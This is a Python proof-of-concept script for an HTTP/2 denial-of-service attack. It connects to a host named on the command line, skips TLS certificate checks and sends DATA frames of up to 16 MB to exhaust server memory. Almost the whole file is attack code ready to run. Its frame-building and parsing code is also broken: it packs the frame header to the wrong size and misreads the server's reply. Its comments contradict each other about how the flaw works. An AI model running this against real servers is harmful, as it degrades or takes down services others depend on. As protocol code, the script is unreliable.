#!/usr/bin/env python3
"""
Proof-of-Concept: Oversized SETTINGS_MAX_FRAME_SIZE (HTTP/2)

This script demonstrates how an attacker can exploit the HTTP/2 protocol's
SETTINGS_MAX_FRAME_SIZE parameter to force a server to allocate large memory
buffers, potentially leading to memory exhaustion or performance degradation.

Vulnerability: RFC 9113 allows SETTINGS_MAX_FRAME_SIZE up to 2^24 - 1 (16MB).
If a server allocates contiguous memory for frame payloads based on this setting,
attacking with many concurrent connections sending large frames can exhaust resources.

Usage:
    python3 poc_oversized_settings_max_frame_size.py <target_host> <target_port> [--h2c]

Note: This is for educational and authorized testing purposes only.
"""

import socket
import ssl
import struct
import sys
import time
import argparse

# HTTP/2 Constants
HTTP2_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'

# Frame Types
FRAME_DATA = 0x0
FRAME_HEADERS = 0x1
FRAME_SETTINGS = 0x4
FRAME_SETTINGS_ACK = 0x4

# Settings Identifiers
SETTINGS_MAX_FRAME_SIZE = 0x05

# Maximum allowed frame size per RFC 9113
MAX_FRAME_SIZE = (1 << 24) - 1  # 16,777,215 octets

def create_http2_frame(frame_type, flags, stream_id, payload):
    """
    Constructs an HTTP/2 frame.
    Format: 3-byte length + 1-byte type + 1-byte flags + 4-byte stream ID + payload
    """
    length = len(payload)
    # Stream ID is 31 bits, but we use 4 bytes for simplicity (MSB is reserved)
    frame_header = struct.pack('!IIB', length, frame_type, flags)
    frame_header += struct.pack('!I', stream_id & 0x7FFFFFFF)
    return frame_header + payload

def create_settings_frame(settings_dict):
    """
    Creates a SETTINGS frame payload.
    Each setting is a 6-byte entry: 2-byte identifier + 4-byte value.
    """
    payload = b''
    for setting_id, value in settings_dict.items():
        payload += struct.pack('!HI', setting_id, value)
    return create_http2_frame(FRAME_SETTINGS, 0x0, 0, payload)

def create_settings_ack_frame():
    """
    Creates a SETTINGS ACK frame (empty payload, ACK flag set).
    """
    return create_http2_frame(FRAME_SETTINGS, 0x1, 0, b'')

def create_data_frame(stream_id, payload, end_stream=False):
    """
    Creates a DATA frame.
    """
    flags = 0x1 if end_stream else 0x0  # END_STREAM flag
    return create_http2_frame(FRAME_DATA, flags, stream_id, payload)

def send_http2_connection(socket_obj, use_tls=True):
    """
    Establishes an HTTP/2 connection by sending the connection preface
    and initial SETTINGS frame.
    """
    # Send HTTP/2 Connection Preface
    socket_obj.sendall(HTTP2_PREFACE)
    
    # Send initial SETTINGS frame with MAX_FRAME_SIZE set to maximum allowed
    # This tells the server we can receive large frames, but more importantly,
    # we will send large frames if the server accepts this setting.
    # Note: In this PoC, we are the client, so we set what WE can receive.
    # However, to trigger the vulnerability, we need the SERVER to accept large frames.
    # We achieve this by sending a SETTINGS frame to the server with our own limits,
    # and then sending large DATA frames. The server must process these large frames.
    # The vulnerability lies in the server's handling of large incoming frames.
    
    # We send a SETTINGS frame to the server. We can set SETTINGS_MAX_FRAME_SIZE
    # to the maximum to indicate we can handle large frames, but the key is
    # that we will SEND large frames to the server. The server must be able to
    # receive frames up to the size it advertised. If the server advertised a large
    # size, we can send large frames. If not, we are limited by its setting.
    # For this PoC, we assume the server uses the default or a large setting.
    # We will send a SETTINGS frame with our own limits, then proceed.
    
    initial_settings = {
        SETTINGS_MAX_FRAME_SIZE: MAX_FRAME_SIZE
    }
    settings_frame = create_settings_frame(initial_settings)
    socket_obj.sendall(settings_frame)
    
    # Wait for SETTINGS ACK from server
    # In a real scenario, we would parse the response. For this PoC, we assume
    # the server sends an ACK. We'll read a small amount to check.
    try:
        response = socket_obj.recv(1024)
        # Check if we received a SETTINGS ACK (type 0x4, flags 0x1, length 0)
        if len(response) >= 9:
            length = struct.unpack('!I', response[0:3])[0]
            frame_type = response[3]
            flags = response[4]
            if frame_type == FRAME_SETTINGS and (flags & 0x1) and length == 0:
                print("[+] Received SETTINGS ACK from server.")
            else:
                print("[!] Unexpected response from server.")
    except Exception as e:
        print(f"[!] Error receiving SETTINGS ACK: {e}")

def exploit_oversized_frames(socket_obj, num_frames=1, frame_size=MAX_FRAME_SIZE):
    """
    Sends oversized DATA frames to the server to trigger memory allocation.
    """
    print(f"[*] Sending {num_frames} DATA frame(s) of size {frame_size} bytes...")
    
    # Generate a payload. In a real attack, this could be random or compressed data.
    # For demonstration, we use a pattern.
    payload = b'A' * frame_size
    
    for i in range(num_frames):
        stream_id = 1 + (i * 2)  # Client-initiated streams are odd
        data_frame = create_data_frame(stream_id, payload, end_stream=True)
        
        try:
            socket_obj.sendall(data_frame)
            print(f"[+] Sent DATA frame {i+1} on stream {stream_id}.")
        except Exception as e:
            print(f"[!] Failed to send DATA frame {i+1}: {e}")
            break
        
        # Small delay to allow server to process
        time.sleep(0.1)

def main():
    parser = argparse.ArgumentParser(description='HTTP/2 Oversized SETTINGS_MAX_FRAME_SIZE PoC')
    parser.add_argument('host', help='Target host')
    parser.add_argument('port', type=int, help='Target port')
    parser.add_argument('--h2c', action='store_true', help='Use h2c (cleartext HTTP/2)')
    parser.add_argument('--frames', type=int, default=1, help='Number of large frames to send')
    parser.add_argument('--size', type=int, default=MAX_FRAME_SIZE, help='Size of each frame (max 16MB)')
    
    args = parser.parse_args()
    
    if args.size > MAX_FRAME_SIZE:
        print("[!] Frame size exceeds maximum allowed by RFC 9113.")
        sys.exit(1)
    
    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Using {'h2c' if args.h2c else 'h2 (TLS)'}")
    print(f"[*] Frame size: {args.size} bytes")
    print(f"[*] Number of frames: {args.frames}")
    
    try:
        if args.h2c:
            # Cleartext HTTP/2
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((args.host, args.port))
        else:
            # TLS HTTP/2
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=args.host)
            sock.connect((args.host, args.port))
        
        print("[+] Connection established.")
        
        # Step 1: Establish HTTP/2 connection
        send_http2_connection(sock, use_tls=not args.h2c)
        
        # Step 2 & 3: Send oversized frames
        exploit_oversized_frames(sock, num_frames=args.frames, frame_size=args.size)
        
        # Step 4: Observe outcome
        print("[*] Attack completed. Check server memory usage and performance.")
        
        # Close connection
        sock.close()
        print("[+] Connection closed.")
        
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
